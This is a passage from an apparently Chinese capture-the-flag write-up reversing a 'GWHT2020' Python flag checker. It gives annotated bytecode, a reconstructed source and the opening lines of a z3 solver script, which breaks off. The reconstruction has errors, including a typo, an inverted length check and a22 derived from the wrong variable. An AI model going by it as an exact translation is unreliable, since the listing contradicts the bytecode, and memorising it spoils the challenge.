class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br></pre></td><td class="code"><pre><span class="line">  4           0 LOAD_CONST               0 (3)</span><br><span class="line">              3 LOAD_CONST               1 (37)</span><br><span class="line">              6 LOAD_CONST               2 (72)</span><br><span class="line">              9 LOAD_CONST               3 (9)</span><br><span class="line">             12 LOAD_CONST               4 (6)</span><br><span class="line">             15 LOAD_CONST               5 (132)</span><br><span class="line">             18 BUILD_LIST               6</span><br><span class="line">             21 STORE_NAME               0 (en)</span><br><span class="line">en&#x3D;[3,37,72,9,6,132]</span><br><span class="line"></span><br><span class="line">  5          24 LOAD_CONST               6 (101)</span><br><span class="line">             27 LOAD_CONST               7 (96)</span><br><span class="line">             30 LOAD_CONST               8 (23)</span><br><span class="line">             33 LOAD_CONST               9 (68)</span><br><span class="line">             36 LOAD_CONST              10 (112)</span><br><span class="line">             39 LOAD_CONST              11 (42)</span><br><span class="line">             42 LOAD_CONST              12 (107)</span><br><span class="line">             45 LOAD_CONST              13 (62)</span><br><span class="line">             48 LOAD_CONST               7 (96)</span><br><span class="line">             51 LOAD_CONST              14 (53)</span><br><span class="line">             54 LOAD_CONST              15 (176)</span><br><span class="line">             57 LOAD_CONST              16 (179)</span><br><span class="line">             60 LOAD_CONST              17 (98)</span><br><span class="line">             63 LOAD_CONST              14 (53)</span><br><span class="line">             66 LOAD_CONST              18 (67)</span><br><span class="line">             69 LOAD_CONST              19 (29)</span><br><span class="line">             72 LOAD_CONST              20 (41)</span><br><span class="line">             75 LOAD_CONST              21 (120)</span><br><span class="line">             78 LOAD_CONST              22 (60)</span><br><span class="line">             81 LOAD_CONST              23 (106)</span><br><span class="line">             84 LOAD_CONST              24 (51)</span><br><span class="line">             87 LOAD_CONST               6 (101)</span><br><span class="line">             90 LOAD_CONST              25 (178)</span><br><span class="line">             93 LOAD_CONST              26 (189)</span><br><span class="line">             96 LOAD_CONST               6 (101)</span><br><span class="line">             99 LOAD_CONST              27 (48)</span><br><span class="line">            102 BUILD_LIST              26</span><br><span class="line">            105 STORE_NAME               1 (output)</span><br><span class="line">output&#x3D;[101, 96, 23, 68, 112, 42, 107, 62, 96, 53, 176, 179, 98, 53, 67, 29, 41, 120, 60, 106, 51, 101, 178, 189, 101, 48]</span><br><span class="line"></span><br><span class="line">  7         108 LOAD_CONST              28 (&#39;welcome to GWHT2020&#39;)</span><br><span class="line">            111 PRINT_ITEM          </span><br><span class="line">            112 PRINT_NEWLINE       </span><br><span class="line"></span><br><span class="line">  9         113 LOAD_NAME                2 (raw_input)</span><br><span class="line">            116 LOAD_CONST              29 (&#39;please input your flag:&#39;)</span><br><span class="line">            119 CALL_FUNCTION            1</span><br><span class="line">            122 STORE_NAME               3 (flag)</span><br><span class="line">input(flag)</span><br><span class="line"></span><br><span class="line"> 10         125 LOAD_NAME                3 (flag)</span><br><span class="line">            128 STORE_NAME               4 (str)</span><br><span class="line">str&#x3D;flag</span><br><span class="line"></span><br><span class="line"> 12         131 LOAD_NAME                5 (len)</span><br><span class="line">            134 LOAD_NAME                4 (str)</span><br><span class="line">            137 CALL_FUNCTION            1</span><br><span class="line">            140 STORE_NAME               6 (a)</span><br><span class="line">a&#x3D;len(str)</span><br><span class="line"></span><br><span class="line"> 13         143 LOAD_NAME                6 (a)</span><br><span class="line">            146 LOAD_CONST              30 (38)</span><br><span class="line">            149 COMPARE_OP               0 (&lt;)</span><br><span class="line">            152 POP_JUMP_IF_FALSE      173</span><br><span class="line">if(a&lt;38)  </span><br><span class="line">    jump to 173</span><br><span class="line"></span><br><span class="line"> 14         155 LOAD_CONST              31 (&#39;lenth wrong!&#39;)</span><br><span class="line">            158 PRINT_ITEM          </span><br><span class="line">            159 PRINT_NEWLINE       </span><br><span class="line"></span><br><span class="line"> 15         160 LOAD_NAME                7 (exit)</span><br><span class="line">            163 LOAD_CONST              32 (0)</span><br><span class="line">            166 CALL_FUNCTION            1</span><br><span class="line">            169 POP_TOP             </span><br><span class="line">            170 JUMP_FORWARD             0 (to 173)</span><br><span class="line"></span><br><span class="line"> 17     &gt;&gt;  173 LOAD_NAME                8 (ord)</span><br><span class="line">            176 LOAD_NAME                4 (str)</span><br><span class="line">            179 LOAD_CONST              32 (0)</span><br><span class="line">            182 BINARY_SUBSCR       </span><br><span class="line">            183 CALL_FUNCTION            1</span><br><span class="line">            186 LOAD_CONST              33 (2020)</span><br><span class="line">            189 BINARY_MULTIPLY                         str[0]*2020</span><br><span class="line">            190 LOAD_NAME                8 (ord)</span><br><span class="line">            193 LOAD_NAME                4 (str)</span><br><span class="line">            196 LOAD_CONST              34 (1)</span><br><span class="line">            199 BINARY_SUBSCR       </span><br><span class="line">            200 CALL_FUNCTION            1</span><br><span class="line">            203 BINARY_ADD          </span><br><span class="line">            204 LOAD_CONST              33 (2020)</span><br><span class="line">            207 BINARY_MULTIPLY                         (str[0]*2020+str[1])*2020     </span><br><span class="line">            208 LOAD_NAME                8 (ord)</span><br><span class="line">            211 LOAD_NAME                4 (str)</span><br><span class="line">            214 LOAD_CONST              35 (2)</span><br><span class="line">            217 BINARY_SUBSCR       </span><br><span class="line">            218 CALL_FUNCTION            1</span><br><span class="line">            221 BINARY_ADD          </span><br><span class="line">            222 LOAD_CONST              33 (2020)</span><br><span class="line">            225 BINARY_MULTIPLY     </span><br><span class="line">            226 LOAD_NAME                8 (ord)</span><br><span class="line">            229 LOAD_NAME                4 (str)</span><br><span class="line">            232 LOAD_CONST               0 (3)</span><br><span class="line">            235 BINARY_SUBSCR       </span><br><span class="line">            236 CALL_FUNCTION            1</span><br><span class="line">            239 BINARY_ADD          </span><br><span class="line">            240 LOAD_CONST              33 (2020)</span><br><span class="line">            243 BINARY_MULTIPLY     </span><br><span class="line">            244 LOAD_NAME                8 (ord)</span><br><span class="line">            247 LOAD_NAME                4 (str)</span><br><span class="line">            250 LOAD_CONST              36 (4)</span><br><span class="line">            253 BINARY_SUBSCR       </span><br><span class="line">            254 CALL_FUNCTION            1</span><br><span class="line">            257 BINARY_ADD          </span><br><span class="line">            258 LOAD_CONST              37 (1182843538814603)</span><br><span class="line">            261 COMPARE_OP               2 (&#x3D;&#x3D;)</span><br><span class="line">            264 POP_JUMP_IF_FALSE      275</span><br><span class="line">if(((((str[0]*2020+str[1])*2020+str[2])*2020+str[3])*2020+str[4])!&#x3D;1182843538814603)</span><br><span class="line">    jump to 275</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> 18         267 LOAD_CONST              38 (&#39;good!continue\xe2\x80\xa6\xe2\x80\xa6&#39;)</span><br><span class="line">            270 PRINT_ITEM          </span><br><span class="line">            271 PRINT_NEWLINE       </span><br><span class="line">            272 JUMP_FORWARD            15 (to 290)</span><br><span class="line"></span><br><span class="line"> 20     &gt;&gt;  275 LOAD_CONST              39 (&#39;bye~&#39;)</span><br><span class="line">            278 PRINT_ITEM          </span><br><span class="line">            279 PRINT_NEWLINE       </span><br><span class="line"></span><br><span class="line"> 21         280 LOAD_NAME                7 (exit)</span><br><span class="line">            283 LOAD_CONST              32 (0)</span><br><span class="line">            286 CALL_FUNCTION            1</span><br><span class="line">            289 POP_TOP             </span><br><span class="line"></span><br><span class="line"> 23     &gt;&gt;  290 BUILD_LIST               0</span><br><span class="line">            293 STORE_NAME               9 (x)</span><br><span class="line"></span><br><span class="line"> 24         296 LOAD_CONST              40 (5)</span><br><span class="line">            299 STORE_NAME              10 (k)          k&#x3D;5</span><br><span class="line"></span><br><span class="line"> 25         302 SETUP_LOOP             128 (to 433)</span><br><span class="line">            305 LOAD_NAME               11 (range)</span><br><span class="line">            308 LOAD_CONST              41 (13)         range(13)</span><br><span class="line">            311 CALL_FUNCTION            1</span><br><span class="line">            314 GET_ITER            </span><br><span class="line">        &gt;&gt;  315 FOR_ITER               114 (to 432)</span><br><span class="line">            318 STORE_NAME              12 (i)</span><br><span class="line"></span><br><span class="line"> 26         321 LOAD_NAME                8 (ord)</span><br><span class="line">            324 LOAD_NAME                4 (str)</span><br><span class="line">            327 LOAD_NAME               10 (k)</span><br><span class="line">            330 BINARY_SUBSCR       </span><br><span class="line">            331 CALL_FUNCTION            1</span><br><span class="line">            334 STORE_NAME              13 (b)          b&#x3D;ord(str[k])</span><br><span class="line"></span><br><span class="line"> 27         337 LOAD_NAME                8 (ord)</span><br><span class="line">            340 LOAD_NAME                4 (str)</span><br><span class="line">            343 LOAD_NAME               10 (k)</span><br><span class="line">            346 LOAD_CONST              34 (1)</span><br><span class="line">            349 BINARY_ADD          </span><br><span class="line">            350 BINARY_SUBSCR       </span><br><span class="line">            351 CALL_FUNCTION            1</span><br><span class="line">            354 STORE_NAME              14 (c)          c&#x3D;ord(str[k+1])</span><br><span class="line"></span><br><span class="line"> 28         357 LOAD_NAME               14 (c)</span><br><span class="line">            360 LOAD_NAME                0 (en)</span><br><span class="line">            363 LOAD_NAME               12 (i)</span><br><span class="line">            366 LOAD_CONST               4 (6)</span><br><span class="line">            369 BINARY_MODULO                    </span><br><span class="line">            370 BINARY_SUBSCR       </span><br><span class="line">            371 BINARY_XOR                              </span><br><span class="line">            372 STORE_NAME              15 (a11)        a11&#x3D;c^en[i%6]</span><br><span class="line"></span><br><span class="line"> 29         375 LOAD_NAME               13 (b)</span><br><span class="line">            378 LOAD_NAME                0 (en)</span><br><span class="line">            381 LOAD_NAME               12 (i)</span><br><span class="line">            384 LOAD_CONST               4 (6)</span><br><span class="line">            387 BINARY_MODULO       </span><br><span class="line">            388 BINARY_SUBSCR       </span><br><span class="line">            389 BINARY_XOR          </span><br><span class="line">            390 STORE_NAME              16 (a22)        a22&#x3D;c^en[i%6]</span><br><span class="line"></span><br><span class="line"> 30         393 LOAD_NAME                9 (x)</span><br><span class="line">            396 LOAD_ATTR               17 (append)</span><br><span class="line">            399 LOAD_NAME               15 (a11)        x.append(a11)</span><br><span class="line">            402 CALL_FUNCTION            1</span><br><span class="line">            405 POP_TOP             </span><br><span class="line"></span><br><span class="line"> 31         406 LOAD_NAME                9 (x)</span><br><span class="line">            409 LOAD_ATTR               17 (append)</span><br><span class="line">            412 LOAD_NAME               16 (a22)        x.append(a22)</span><br><span class="line">            415 CALL_FUNCTION            1</span><br><span class="line">            418 POP_TOP             </span><br><span class="line"></span><br><span class="line"> 32         419 LOAD_NAME               10 (k)</span><br><span class="line">            422 LOAD_CONST              35 (2)</span><br><span class="line">            425 INPLACE_ADD                           </span><br><span class="line">            426 STORE_NAME              10 (k)          k+&#x3D;2</span><br><span class="line">            429 JUMP_ABSOLUTE          315</span><br><span class="line">        &gt;&gt;  432 POP_BLOCK           </span><br><span class="line"></span><br><span class="line"> 33     &gt;&gt;  433 LOAD_NAME                9 (x)</span><br><span class="line">            436 LOAD_NAME                1 (output)</span><br><span class="line">            439 COMPARE_OP               2 (&#x3D;&#x3D;)</span><br><span class="line">            442 POP_JUMP_IF_FALSE      453</span><br><span class="line">if(x!&#x3D;output)</span><br><span class="line">    jump to 453</span><br><span class="line"></span><br><span class="line"> 34         445 LOAD_CONST              38 (&#39;good!continue\xe2\x80\xa6\xe2\x80\xa6&#39;)</span><br><span class="line">            448 PRINT_ITEM          </span><br><span class="line">            449 PRINT_NEWLINE       </span><br><span class="line">            450 JUMP_FORWARD            15 (to 468)</span><br><span class="line"></span><br><span class="line"> 36     &gt;&gt;  453 LOAD_CONST              42 (&#39;oh,you are wrong!&#39;)</span><br><span class="line">            456 PRINT_ITEM          </span><br><span class="line">            457 PRINT_NEWLINE       </span><br><span class="line"></span><br><span class="line"> 37         458 LOAD_NAME                7 (exit)</span><br><span class="line">            461 LOAD_CONST              32 (0)</span><br><span class="line">            464 CALL_FUNCTION            1</span><br><span class="line">            467 POP_TOP             </span><br><span class="line"></span><br><span class="line"> 39     &gt;&gt;  468 LOAD_NAME                5 (len)</span><br><span class="line">            471 LOAD_NAME                4 (str)</span><br><span class="line">            474 CALL_FUNCTION            1</span><br><span class="line">            477 STORE_NAME              18 (l)          l&#x3D;len(str)</span><br><span class="line"></span><br><span class="line"> 40         480 LOAD_NAME                8 (ord)</span><br><span class="line">            483 LOAD_NAME                4 (str)</span><br><span class="line">            486 LOAD_NAME               18 (l)</span><br><span class="line">            489 LOAD_CONST              43 (7)</span><br><span class="line">            492 BINARY_SUBTRACT     </span><br><span class="line">            493 BINARY_SUBSCR                           </span><br><span class="line">            494 CALL_FUNCTION            1</span><br><span class="line">            497 STORE_NAME              19 (a1)         a1&#x3D;ord(str[l-7])</span><br><span class="line"></span><br><span class="line"> 41         500 LOAD_NAME                8 (ord)</span><br><span class="line">            503 LOAD_NAME                4 (str)</span><br><span class="line">            506 LOAD_NAME               18 (l)</span><br><span class="line">            509 LOAD_CONST               4 (6)</span><br><span class="line">            512 BINARY_SUBTRACT     </span><br><span class="line">            513 BINARY_SUBSCR       </span><br><span class="line">            514 CALL_FUNCTION            1</span><br><span class="line">            517 STORE_NAME              20 (a2)         a2&#x3D;ord(str[l-6])</span><br><span class="line"></span><br><span class="line"> 42         520 LOAD_NAME                8 (ord)</span><br><span class="line">            523 LOAD_NAME                4 (str)</span><br><span class="line">            526 LOAD_NAME               18 (l)</span><br><span class="line">            529 LOAD_CONST              40 (5)</span><br><span class="line">            532 BINARY_SUBTRACT     </span><br><span class="line">            533 BINARY_SUBSCR       </span><br><span class="line">            534 CALL_FUNCTION            1</span><br><span class="line">            537 STORE_NAME              21 (a3)</span><br><span class="line"></span><br><span class="line"> 43         540 LOAD_NAME                8 (ord)</span><br><span class="line">            543 LOAD_NAME                4 (str)</span><br><span class="line">            546 LOAD_NAME               18 (l)</span><br><span class="line">            549 LOAD_CONST              36 (4)</span><br><span class="line">            552 BINARY_SUBTRACT     </span><br><span class="line">            553 BINARY_SUBSCR       </span><br><span class="line">            554 CALL_FUNCTION            1</span><br><span class="line">            557 STORE_NAME              22 (a4)</span><br><span class="line"></span><br><span class="line"> 44         560 LOAD_NAME                8 (ord)</span><br><span class="line">            563 LOAD_NAME                4 (str)</span><br><span class="line">            566 LOAD_NAME               18 (l)</span><br><span class="line">            569 LOAD_CONST               0 (3)</span><br><span class="line">            572 BINARY_SUBTRACT     </span><br><span class="line">            573 BINARY_SUBSCR       </span><br><span class="line">            574 CALL_FUNCTION            1</span><br><span class="line">            577 STORE_NAME              23 (a5)</span><br><span class="line"></span><br><span class="line"> 45         580 LOAD_NAME                8 (ord)</span><br><span class="line">            583 LOAD_NAME                4 (str)</span><br><span class="line">            586 LOAD_NAME               18 (l)</span><br><span class="line">            589 LOAD_CONST              35 (2)</span><br><span class="line">            592 BINARY_SUBTRACT     </span><br><span class="line">            593 BINARY_SUBSCR       </span><br><span class="line">            594 CALL_FUNCTION            1</span><br><span class="line">            597 STORE_NAME              24 (a6)</span><br><span class="line"></span><br><span class="line"> 46         600 LOAD_NAME               19 (a1)</span><br><span class="line">            603 LOAD_CONST               0 (3)</span><br><span class="line">            606 BINARY_MULTIPLY     </span><br><span class="line">            607 LOAD_NAME               20 (a2)</span><br><span class="line">            610 LOAD_CONST              35 (2)</span><br><span class="line">            613 BINARY_MULTIPLY         </span><br><span class="line">            614 BINARY_ADD          </span><br><span class="line">            615 LOAD_NAME               21 (a3)</span><br><span class="line">            618 LOAD_CONST              40 (5)</span><br><span class="line">            621 BINARY_MULTIPLY     </span><br><span class="line">            622 BINARY_ADD          </span><br><span class="line">            623 LOAD_CONST              44 (1003)</span><br><span class="line">            626 COMPARE_OP               2 (&#x3D;&#x3D;)</span><br><span class="line">            629 POP_JUMP_IF_FALSE      807</span><br><span class="line">if((a[1]*3+a[2]*2+a[3]*5)!&#x3D;1003)</span><br><span class="line">    jump to 807</span><br><span class="line"></span><br><span class="line"> 47         632 LOAD_NAME               19 (a1)</span><br><span class="line">            635 LOAD_CONST              36 (4)</span><br><span class="line">            638 BINARY_MULTIPLY     </span><br><span class="line">            639 LOAD_NAME               20 (a2)</span><br><span class="line">            642 LOAD_CONST              43 (7)</span><br><span class="line">            645 BINARY_MULTIPLY     </span><br><span class="line">            646 BINARY_ADD          </span><br><span class="line">            647 LOAD_NAME               21 (a3)</span><br><span class="line">            650 LOAD_CONST               3 (9)</span><br><span class="line">            653 BINARY_MULTIPLY     </span><br><span class="line">            654 BINARY_ADD          </span><br><span class="line">            655 LOAD_CONST              45 (2013)</span><br><span class="line">            658 COMPARE_OP               2 (&#x3D;&#x3D;)</span><br><span class="line">            661 POP_JUMP_IF_FALSE      807</span><br><span class="line"></span><br><span class="line"> 48         664 LOAD_NAME               19 (a1)</span><br><span class="line">            667 LOAD_NAME               20 (a2)</span><br><span class="line">            670 LOAD_CONST              46 (8)</span><br><span class="line">            673 BINARY_MULTIPLY     </span><br><span class="line">            674 BINARY_ADD          </span><br><span class="line">            675 LOAD_NAME               21 (a3)</span><br><span class="line">            678 LOAD_CONST              35 (2)</span><br><span class="line">            681 BINARY_MULTIPLY     </span><br><span class="line">            682 BINARY_ADD          </span><br><span class="line">            683 LOAD_CONST              47 (1109)</span><br><span class="line">            686 COMPARE_OP               2 (&#x3D;&#x3D;)</span><br><span class="line">            689 POP_JUMP_IF_FALSE      804</span><br><span class="line"></span><br><span class="line"> 49         692 LOAD_NAME               22 (a4)</span><br><span class="line">            695 LOAD_CONST               0 (3)</span><br><span class="line">            698 BINARY_MULTIPLY     </span><br><span class="line">            699 LOAD_NAME               23 (a5)</span><br><span class="line">            702 LOAD_CONST              35 (2)</span><br><span class="line">            705 BINARY_MULTIPLY     </span><br><span class="line">            706 BINARY_ADD          </span><br><span class="line">            707 LOAD_NAME               24 (a6)</span><br><span class="line">            710 LOAD_CONST              40 (5)</span><br><span class="line">            713 BINARY_MULTIPLY     </span><br><span class="line">            714 BINARY_ADD          </span><br><span class="line">            715 LOAD_CONST              48 (671)</span><br><span class="line">            718 COMPARE_OP               2 (&#x3D;&#x3D;)</span><br><span class="line">            721 POP_JUMP_IF_FALSE      801</span><br><span class="line"></span><br><span class="line"> 50         724 LOAD_NAME               22 (a4)</span><br><span class="line">            727 LOAD_CONST              36 (4)</span><br><span class="line">            730 BINARY_MULTIPLY     </span><br><span class="line">            731 LOAD_NAME               23 (a5)</span><br><span class="line">            734 LOAD_CONST              43 (7)</span><br><span class="line">            737 BINARY_MULTIPLY     </span><br><span class="line">            738 BINARY_ADD          </span><br><span class="line">            739 LOAD_NAME               24 (a6)</span><br><span class="line">            742 LOAD_CONST               3 (9)</span><br><span class="line">            745 BINARY_MULTIPLY     </span><br><span class="line">            746 BINARY_ADD          </span><br><span class="line">            747 LOAD_CONST              49 (1252)</span><br><span class="line">            750 COMPARE_OP               2 (&#x3D;&#x3D;)</span><br><span class="line">            753 POP_JUMP_IF_FALSE      798</span><br><span class="line"></span><br><span class="line"> 51         756 LOAD_NAME               22 (a4)</span><br><span class="line">            759 LOAD_NAME               23 (a5)</span><br><span class="line">            762 LOAD_CONST              46 (8)</span><br><span class="line">            765 BINARY_MULTIPLY     </span><br><span class="line">            766 BINARY_ADD          </span><br><span class="line">            767 LOAD_NAME               24 (a6)</span><br><span class="line">            770 LOAD_CONST              35 (2)</span><br><span class="line">            773 BINARY_MULTIPLY     </span><br><span class="line">            774 BINARY_ADD          </span><br><span class="line">            775 LOAD_CONST              50 (644)</span><br><span class="line">            778 COMPARE_OP               2 (&#x3D;&#x3D;)</span><br><span class="line">            781 POP_JUMP_IF_FALSE      795</span><br><span class="line"></span><br><span class="line"> 52         784 LOAD_CONST              51 (&#39;congraduation!you get the right flag!&#39;)</span><br><span class="line">            787 PRINT_ITEM          </span><br><span class="line">            788 PRINT_NEWLINE       </span><br><span class="line">            789 JUMP_ABSOLUTE          795</span><br><span class="line">            792 JUMP_ABSOLUTE          798</span><br><span class="line">        &gt;&gt;  795 JUMP_ABSOLUTE          801</span><br><span class="line">        &gt;&gt;  798 JUMP_ABSOLUTE          804</span><br><span class="line">        &gt;&gt;  801 JUMP_ABSOLUTE          807</span><br><span class="line">        &gt;&gt;  804 JUMP_FORWARD             0 (to 807)</span><br><span class="line">        &gt;&gt;  807 LOAD_CONST              52 (None)</span><br><span class="line">            810 RETURN_VALUE </span><br></pre></td></tr></table></figure><blockquote><p>python源码</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">en&#x3D;[3,37,72,9,6,132]</span><br><span class="line">output&#x3D;[101, 96, 23, 68, 112, 42, 107, 62, 96, 53, 176, 179, 98, 53, 67, 29, 41, 120, 60, 106, 51, 101, 178, 189, 101, 48]</span><br><span class="line">print(&#39;welcome to GWHT2020&#39;)</span><br><span class="line">flag&#x3D;raw_input(&#39;please input your flag:&#39;)</span><br><span class="line">str&#x3D;flag</span><br><span class="line">a&#x3D;len(str)</span><br><span class="line">if a&gt;&#x3D;38:</span><br><span class="line">peint(&#39;lenth wrong!&#39;)</span><br><span class="line">exit(0)</span><br><span class="line">if((((ord(str[1])+2020*ord(str[0]))*2020+ord(str[2]))*2020+ord(str[3]))*2020+ord(str[4])!&#x3D;1182843538814603):</span><br><span class="line">print(&#39;bye~&#39;)</span><br><span class="line">exit(0)</span><br><span class="line">print(&#39;good!continue\xe2\x80\xa6\xe2\x80\xa6&#39;)</span><br><span class="line">k&#x3D;5</span><br><span class="line">for i in range(13):</span><br><span class="line">b&#x3D;ord(str[k])</span><br><span class="line">c&#x3D;ord(str[k+1])</span><br><span class="line">a11&#x3D;c^en[i%6]</span><br><span class="line">a22&#x3D;c^en[i%6]</span><br><span class="line">x.append(a11)</span><br><span class="line">x.append(a22)</span><br><span class="line">k+&#x3D;2</span><br><span class="line">if x!&#x3D;output:</span><br><span class="line">print(&#39;oh,you are wrong!&#39;)</span><br><span class="line">exit(0)</span><br><span class="line">l&#x3D;len(str)</span><br><span class="line">a1&#x3D;ord(str[l-7])</span><br><span class="line">a2&#x3D;ord(str[l-6])</span><br><span class="line">a3&#x3D;ord(str[l-5])</span><br><span class="line">a4&#x3D;ord(str[l-4])</span><br><span class="line">a5&#x3D;ord(str[l-3])</span><br><span class="line">a6&#x3D;ord(str[l-2])</span><br><span class="line">if((a1*3+a2*2+a3*5&#x3D;&#x3D;1003)&amp;(a1*4+a2*7+a3*9&#x3D;&#x3D;2013)&amp;(a1+a2*8+a3*2&#x3D;&#x3D;1109)&amp;(a4*3+a5*2+a6*5&#x3D;&#x3D;671)&amp;(a4*4+a5*7+a6*9&#x3D;&#x3D;1252)&amp;(a4+a5*8+a6*2&#x3D;&#x3D;644)):</span><br><span class="line">print(&#39;congraduation!you get the right flag!&#39;)</span><br></pre></td></tr></table></figure><blockquote><p>exp</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">en&#x3D;[3,37,72,9,6,132]</span><br><span class="line">output&#x3D;[101,96,23,68,112,42,107,62,96,53,176,179,98,53,67,29,41,120,60,106,51,101,178,189,101,48]</span><br><span class="line">x &#x3D; Solver()</span><br><span 